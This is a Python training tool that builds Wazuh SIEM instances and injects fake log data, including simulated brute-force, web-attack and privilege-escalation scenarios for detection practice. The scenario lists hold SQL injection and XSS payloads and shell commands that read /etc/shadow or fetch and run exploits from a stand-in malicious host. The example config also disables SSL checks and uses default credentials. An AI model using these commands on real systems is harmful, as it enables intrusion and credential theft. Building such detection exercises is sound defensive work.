import requests
import json
import random
import datetime
import os
import yaml
import uuid
from faker import Faker

# Initialize faker for generating realistic data
fake = Faker()


class SimpleWazuhTrainer:
    """
    A simplified Wazuh training platform that focuses on:
    1. Creating instances with Docker
    2. Adding users via Wazuh API
    3. Injecting logs directly via Wazuh API
    """

    def __init__(self, config_file="config.yaml"):
        """Initialize with configuration"""
        with open(config_file, "r") as file:
            self.config = yaml.safe_load(file)

        # Set up base URLs
        self.wazuh_base_url = self.config.get(
            "wazuh_base_url", "https://localhost:55000"
        )

        # Disable SSL warnings for testing environments
        if not self.config.get("verify_ssl", True):
            import urllib3

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        self.verify_ssl = self.config.get("verify_ssl", True)

    def create_wazuh_instance(self, instance_name):
        """
        Create a Wazuh instance using Docker

        This is a simplified version that uses docker-compose
        """
        instance_id = f"wazuh-{instance_name}-{uuid.uuid4().hex[:8]}"

        # Create instance directory
        os.makedirs(f"./instances/{instance_id}", exist_ok=True)

        # Generate credentials
        admin_password = self._generate_password()
        api_password = self._generate_password()

        # Create environment file
        env_content = f"""
WAZUH_DASHBOARD_USER=admin
WAZUH_DASHBOARD_PASSWORD={admin_password}
WAZUH_API_USER=wazuh-api
WAZUH_API_PASSWORD={api_password}
INSTANCE_NAME={instance_name}
INSTANCE_ID={instance_id}
        """

        with open(f"./instances/{instance_id}/.env", "w") as file:
            file.write(env_content)

        # Copy docker-compose template
        import shutil

        shutil.copyfile(
            "./templates/docker-compose.yml",
            f"./instances/{instance_id}/docker-compose.yml",
        )

        # Start the containers
        import subprocess

        result = subprocess.run(
            [
                "docker-compose",
                "-f",
                f"./instances/{instance_id}/docker-compose.yml",
                "--env-file",
                f"./instances/{instance_id}/.env",
                "up",
                "-d",
            ],
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            return {
                "status": "error",
                "message": f"Failed to start Wazuh: {result.stderr}",
            }

        # Store instance information
        instance_info = {
            "instance_id": instance_id,
            "name": instance_name,
            "created_at": datetime.datetime.now().isoformat(),
            "dashboard_url": f"https://localhost:443",
            "api_url": self.wazuh_base_url,
            "credentials": {
                "dashboard": {"username": "admin", "password": admin_password},
                "api": {"username": "wazuh-api", "password": api_password},
            },
        }

        with open(f"./instances/{instance_id}/instance.json", "w") as file:
            json.dump(instance_info, file, indent=2)

        return {
            "status": "success",
            "instance_id": instance_id,
            "access_info": {
                "dashboard_url": instance_info["dashboard_url"],
                "dashboard_credentials": instance_info["credentials"]["dashboard"],
                "api_credentials": instance_info["credentials"]["api"],
            },
        }

    def _generate_password(self, length=12):
        """Generate a secure random password"""
        import secrets
        import string

        alphabet = string.ascii_letters + string.digits
        return "".join(secrets.choice(alphabet) for _ in range(length))

    def get_auth_token(self, instance_id=None):
        """
        Get authentication token for Wazuh API

        If instance_id is provided, use credentials from that instance
        Otherwise use the default credentials from config
        """
        if instance_id:
            # Get credentials from instance file
            try:
                with open(f"./instances/{instance_id}/instance.json", "r") as file:
                    instance_info = json.load(file)
                    username = instance_info["credentials"]["api"]["username"]
                    password = instance_info["credentials"]["api"]["password"]
            except FileNotFoundError:
                return None
        else:
            # Use default credentials from config
            username = self.config.get("api_username", "wazuh-api")
            password = self.config.get("api_password", "wazuh-api")

        # Authenticate to get token
        auth_url = f"{self.wazuh_base_url}/security/user/authenticate"

        try:
            response = requests.get(
                auth_url, auth=(username, password), verify=self.verify_ssl
            )

            if response.status_code == 200:
                return response.json()["data"]["token"]
            else:
                print(f"Authentication failed: {response.text}")
                return None
        except Exception as e:
            print(f"Error authenticating to Wazuh API: {str(e)}")
            return None

    def add_user(self, username, password=None, role="analyst", instance_id=None):
        """
        Add a user to Wazuh via the API
        """
        # Generate password if not provided
        if not password:
            password = self._generate_password()

        # Get auth token
        token = self.get_auth_token(instance_id)
        if not token:
            return {"status": "error", "message": "Failed to authenticate to Wazuh API"}

        # Create user
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }

        user_url = f"{self.wazuh_base_url}/security/users"
        user_data = {"username": username, "password": password}

        try:
            response = requests.post(
                user_url, headers=headers, json=user_data, verify=self.verify_ssl
            )

            if response.status_code != 200:
                return {
                    "status": "error",
                    "message": f"Failed to create user: {response.text}",
                }

            user_id = response.json()["data"]["affected_items"][0]["id"]

            # Map role name to role ID
            role_id = self._get_role_id(role, token)

            # Assign role to user
            role_url = f"{self.wazuh_base_url}/security/roles/{role_id}/users"
            role_data = {"user_ids": [user_id]}

            role_response = requests.post(
                role_url, headers=headers, json=role_data, verify=self.verify_ssl
            )

            if role_response.status_code != 200:
                return {
                    "status": "warning",
                    "message": f"User created but role assignment failed: {role_response.text}",
                    "user_id": user_id,
                    "credentials": {"username": username, "password": password},
                }

            return {
                "status": "success",
                "user_id": user_id,
                "credentials": {
                    "username": username,
                    "password": password,
                    "role": role,
                },
            }

        except Exception as e:
            return {"status": "error", "message": f"Error creating user: {str(e)}"}

    def _get_role_id(self, role_name, token):
        """Map role name to Wazuh role ID"""
        # Default role mapping
        role_mapping = {"admin": 1, "analyst": 2, "readonly": 3}

        # If role exists in mapping, return it
        if role_name in role_mapping:
            return role_mapping[role_name]

        # Otherwise try to look it up by name
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }

        roles_url = f"{self.wazuh_base_url}/security/roles"

        try:
            response = requests.get(roles_url, headers=headers, verify=self.verify_ssl)

            if response.status_code == 200:
                roles = response.json()["data"]["affected_items"]
                for role in roles:
                    if role["name"].lower() == role_name.lower():
                        return role["id"]

            # If not found, return analyst role
            return 2

        except Exception:
            # On error, return analyst role
            return 2

    def add_log(self, log_data, agent_id="000", instance_id=None):
        """
        Add a log entry directly to Wazuh using the API

        Args:
            log_data: Dictionary with log information
            agent_id: Agent ID (default is manager with 000)
            instance_id: Instance ID (for getting credentials)

        Returns:
            dict: Result of the operation
        """
        # Get auth token
        token = self.get_auth_token(instance_id)
        if not token:
            return {"status": "error", "message": "Failed to authenticate to Wazuh API"}

        # Format log data
        if isinstance(log_data, dict):
            formatted_log = json.dumps(log_data)
        else:
            formatted_log = str(log_data)

        # Send log via Wazuh API
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }

        # We're using the custom command endpoint to add a log
        # This is a simplified approach - in real scenarios you might use other methods
        # such as Filebeat, Wazuh agent, or other integrations
        command_url = f"{self.wazuh_base_url}/agents/{agent_id}/command"
        command_data = {"command": "add_log", "arguments": ["-l", formatted_log]}

        try:
            response = requests.put(
                command_url, headers=headers, json=command_data, verify=self.verify_ssl
            )

            if response.status_code != 200:
                return {
                    "status": "error",
                    "message": f"Failed to add log: {response.text}",
                }

            return {"status": "success", "log": log_data}

        except Exception as e:
            return {"status": "error", "message": f"Error adding log: {str(e)}"}

    def generate_fake_logs(self, log_type, count=10, virtual_machine=None):
        """
        Generate fake logs for a virtual machine

        Args:
            log_type: Type of logs to generate (syslog, apache, auth, etc.)
            count: Number of logs to generate
            virtual_machine: Dictionary with VM info (if None, one will be created)

        Returns:
            list: Generated logs
        """
        # Create virtual machine if not provided
        if not virtual_machine:
            virtual_machine = {
                "hostname": f"vm-{uuid.uuid4().hex[:6]}.training.local",
                "ip": f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                "os": random.choice(["Linux", "Windows"]),
                "users": [
                    "admin",
                    "user1",
                    "user2",
                    "root" if random.random() > 0.5 else "Administrator",
                ],
            }

        logs = []

        for _ in range(count):
            timestamp = datetime.datetime.now() - datetime.timedelta(
                seconds=random.randint(0, 3600)
            )

            if log_type == "syslog":
                log = self._generate_syslog(timestamp, virtual_machine)
            elif log_type == "apache":
                log = self._generate_apache_log(timestamp, virtual_machine)
            elif log_type == "auth":
                log = self._generate_auth_log(timestamp, virtual_machine)
            elif log_type == "firewall":
                log = self._generate_firewall_log(timestamp, virtual_machine)
            else:
                # Generic log
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "source": log_type,
                    "message": fake.sentence(),
                    "level": random.choice(["info", "warning", "error"]),
                    "pid": random.randint(1000, 60000),
                }

            logs.append(log)

        # Sort by timestamp
        logs.sort(key=lambda x: x["timestamp"] if isinstance(x, dict) else x)

        return logs

    def _generate_syslog(self, timestamp, vm):
        """Generate a syslog entry"""
        processes = ["systemd", "cron", "sshd", "nginx", "apache2", "kernel"]
        levels = ["INFO", "WARNING", "ERROR", "DEBUG"]

        return {
            "timestamp": timestamp.isoformat(),
            "hostname": vm["hostname"],
            "process": random.choice(processes),
            "pid": random.randint(1000, 60000),
            "level": random.choice(levels),
            "message": fake.sentence(),
        }

    def _generate_apache_log(self, timestamp, vm):
        """Generate an Apache access log entry"""
        methods = ["GET", "POST", "PUT", "DELETE"]
        paths = ["/", "/index.html", "/api/v1/users", "/login", "/static/css/main.css"]
        status_codes = [200, 201, 301, 302, 400, 401, 403, 404, 500]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ]

        return {
            "timestamp": timestamp.isoformat(),
            "client_ip": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
            "request_method": random.choice(methods),
            "request_path": random.choice(paths),
            "protocol": "HTTP/1.1",
            "status_code": random.choice(status_codes),
            "bytes_sent": random.randint(200, 5000),
            "user_agent": random.choice(user_agents),
        }

    def _generate_auth_log(self, timestamp, vm):
        """Generate an authentication log entry"""
        # Choose between success and failure
        success = random.random() > 0.3

        user = random.choice(vm["users"])
        source_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

        if vm["os"] == "Linux":
            if success:
                message = f"Accepted password for {user} from {source_ip} port {random.randint(1024, 65535)}"
            else:
                message = f"Failed password for {user} from {source_ip} port {random.randint(1024, 65535)}"
        else:  # Windows
            if success:
                message = f"An account was successfully logged on. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: {user}"
            else:
                message = f"An account failed to log on. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: {user}"

        return {
            "timestamp": timestamp.isoformat(),
            "hostname": vm["hostname"],
            "process": "sshd"
            if vm["os"] == "Linux"
            else "Microsoft-Windows-Security-Auditing",
            "pid": random.randint(1000, 60000),
            "message": message,
            "user": user,
            "source_ip": source_ip,
            "result": "success" if success else "failure",
        }

    def _generate_firewall_log(self, timestamp, vm):
        """Generate a firewall log entry"""
        actions = ["ACCEPT", "DROP", "REJECT"]
        protocols = ["TCP", "UDP", "ICMP"]

        src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        dst_ip = (
            vm["ip"]
            if random.random() > 0.5
            else f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        )
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080])

        return {
            "timestamp": timestamp.isoformat(),
            "hostname": vm["hostname"],
            "action": random.choice(actions),
            "protocol": random.choice(protocols),
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "bytes": random.randint(64, 8192),
            "interface": "eth0" if vm["os"] == "Linux" else "Ethernet",
        }

    def inject_attack_scenario(self, virtual_machine, scenario_type, instance_id=None):
        """
        Inject an attack scenario into logs

        Args:
            virtual_machine: Dictionary with VM info
            scenario_type: Type of attack (brute_force, web_attack, privilege_escalation)
            instance_id: Instance ID (for authentication)

        Returns:
            dict: Result of the injection
        """
        logs = []

        if scenario_type == "brute_force":
            # Generate brute force attack logs (multiple failed logins, then success)
            target_user = random.choice(virtual_machine["users"])
            attacker_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

            # Failed attempts
            for i in range(random.randint(5, 15)):
                timestamp = datetime.datetime.now() - datetime.timedelta(minutes=15 - i)

                if virtual_machine["os"] == "Linux":
                    log = {
                        "timestamp": timestamp.isoformat(),
                        "hostname": virtual_machine["hostname"],
                        "process": "sshd",
                        "pid": random.randint(1000, 60000),
                        "message": f"Failed password for {target_user} from {attacker_ip} port {random.randint(1024, 65535)}",
                        "user": target_user,
                        "source_ip": attacker_ip,
                        "result": "failure",
                    }
                else:  # Windows
                    log = {
                        "timestamp": timestamp.isoformat(),
                        "hostname": virtual_machine["hostname"],
                        "process": "Microsoft-Windows-Security-Auditing",
                        "pid": random.randint(1000, 60000),
                        "message": f"An account failed to log on. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: {target_user}",
                        "user": target_user,
                        "source_ip": attacker_ip,
                        "result": "failure",
                    }

                logs.append(log)

            # Successful login
            timestamp = datetime.datetime.now()
            if virtual_machine["os"] == "Linux":
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "sshd",
                    "pid": random.randint(1000, 60000),
                    "message": f"Accepted password for {target_user} from {attacker_ip} port {random.randint(1024, 65535)}",
                    "user": target_user,
                    "source_ip": attacker_ip,
                    "result": "success",
                }
            else:  # Windows
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "Microsoft-Windows-Security-Auditing",
                    "pid": random.randint(1000, 60000),
                    "message": f"An account was successfully logged on. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: {target_user}",
                    "user": target_user,
                    "source_ip": attacker_ip,
                    "result": "success",
                }

            logs.append(log)

        elif scenario_type == "web_attack":
            # Generate web attack logs (SQL injection, XSS, etc.)
            attacker_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            attack_paths = [
                "/login.php?user=admin';--",
                "/search.php?q=test%27%20OR%20%271%27=%271",
                "/profile.php?id=1%20OR%201=1",
                "/news.php?id=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11",
                "/contact.php?name=<script>alert('XSS')</script>",
            ]

            for i, path in enumerate(attack_paths):
                timestamp = datetime.datetime.now() - datetime.timedelta(minutes=10 - i)

                log = {
                    "timestamp": timestamp.isoformat(),
                    "client_ip": attacker_ip,
                    "request_method": "GET",
                    "request_path": path,
                    "protocol": "HTTP/1.1",
                    "status_code": random.choice([200, 403, 500]),
                    "bytes_sent": random.randint(200, 5000),
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                }

                logs.append(log)

        elif scenario_type == "privilege_escalation":
            # Generate privilege escalation attack logs
            user = random.choice(virtual_machine["users"])
            timestamp_base = datetime.datetime.now() - datetime.timedelta(minutes=30)

            # Step 1: Normal login
            timestamp = timestamp_base
            if virtual_machine["os"] == "Linux":
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "sshd",
                    "pid": random.randint(1000, 60000),
                    "message": f"Accepted password for {user} from 10.0.0.{random.randint(1, 254)} port {random.randint(1024, 65535)}",
                    "user": user,
                    "source_ip": f"10.0.0.{random.randint(1, 254)}",
                    "result": "success",
                }
            else:  # Windows
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "Microsoft-Windows-Security-Auditing",
                    "pid": random.randint(1000, 60000),
                    "message": f"An account was successfully logged on. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: {user}",
                    "user": user,
                    "result": "success",
                }

            logs.append(log)

            # Step 2: Suspicious commands
            suspicious_commands = []
            if virtual_machine["os"] == "Linux":
                suspicious_commands = [
                    "sudo -l",
                    "find / -perm -u=s -type f 2>/dev/null",
                    "cat /etc/passwd",
                    "cat /etc/shadow",
                    f"sudo su -",
                    "wget http://malicious.example.com/exploit.sh",
                    "chmod +x exploit.sh",
                    "./exploit.sh",
                ]
            else:  # Windows
                suspicious_commands = [
                    "whoami /priv",
                    "net user administrator",
                    "net localgroup administrators",
                    "powershell -ep bypass",
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                    "sc qc UsoSvc",
                    "certutil -urlcache -split -f http://malicious.example.com/exploit.exe",
                    "exploit.exe",
                ]

            for i, command in enumerate(suspicious_commands):
                timestamp = timestamp_base + datetime.timedelta(minutes=i + 1)

                if virtual_machine["os"] == "Linux":
                    log = {
                        "timestamp": timestamp.isoformat(),
                        "hostname": virtual_machine["hostname"],
                        "process": "bash",
                        "pid": random.randint(1000, 60000),
                        "user": user,
                        "command": command,
                        "message": f"User {user} executed command: {command}",
                    }
                else:  # Windows
                    log = {
                        "timestamp": timestamp.isoformat(),
                        "hostname": virtual_machine["hostname"],
                        "process": "cmd.exe",
                        "pid": random.randint(1000, 60000),
                        "user": user,
                        "command": command,
                        "message": f"User {user} executed command: {command}",
                    }

                logs.append(log)

            # Step 3: Root/Admin activity
            timestamp = timestamp_base + datetime.timedelta(
                minutes=len(suspicious_commands) + 1
            )

            if virtual_machine["os"] == "Linux":
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "su",
                    "pid": random.randint(1000, 60000),
                    "message": f"COMMAND: /bin/bash",
                    "user": "root",
                    "successful": True,
                }
            else:  # Windows
                log = {
                    "timestamp": timestamp.isoformat(),
                    "hostname": virtual_machine["hostname"],
                    "process": "Microsoft-Windows-Security-Auditing",
                    "pid": random.randint(1000, 60000),
                    "message": f"A new process has been created. Creator Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-{random.randint(1000, 9999)} Account Name: Administrator",
                    "user": "Administrator",
                    "successful": True,
                }

            logs.append(log)

        else:
            return {
                "status": "error",
                "message": f"Unknown attack scenario: {scenario_type}",
            }

        # Send all logs to Wazuh
        results = []
        for log in logs:
            result = self.add_log(log, instance_id=instance_id)
            results.append(result)

        return {
            "status": "success",
            "scenario": scenario_type,
            "logs_count": len(logs),
            "results": results,
        }


# Example usage
if __name__ == "__main__":
    # Create a configuration file
    config = {
        "wazuh_base_url": "https://localhost:55000",
        "verify_ssl": False,
        "api_username": "wazuh-api",
        "api_password": "wazuh-api",
    }

    with open("config.yaml", "w") as file:
        yaml.dump(config, file)

    # Initialize trainer
    trainer = SimpleWazuhTrainer()

    # Create a Wazuh instance
    instance = trainer.create_wazuh_instance("training-instance")

    if instance["status"] == "success":
        instance_id = instance["instance_id"]

        # Add a user
        user = trainer.add_user("trainee1", role="analyst", instance_id=instance_id)

        # Create a virtual machine
        vm = {
            "hostname": "web-server-1.training.local",
            "ip": "10.0.0.10",
            "os": "Linux",
            "users": ["admin", "www-data", "root"],
        }

        # Generate and add normal logs
        apache_logs = trainer.generate_fake_logs("apache", count=20, virtual_machine=vm)
        for log in apache_logs:
            trainer.add_log(log, instance_id=instance_id)

        # Inject an attack scenario
        trainer.inject_attack_scenario(vm, "web_attack", instance_id=instance_id)

        print(f"Training environment ready!")
        print(f"Wazuh Dashboard: {instance['access_info']['dashboard_url']}")
        print(
            f"Username: {instance['access_info']['dashboard_credentials']['username']}"
        )
        print(
            f"Password: {instance['access_info']['dashboard_credentials']['password']}"
        )
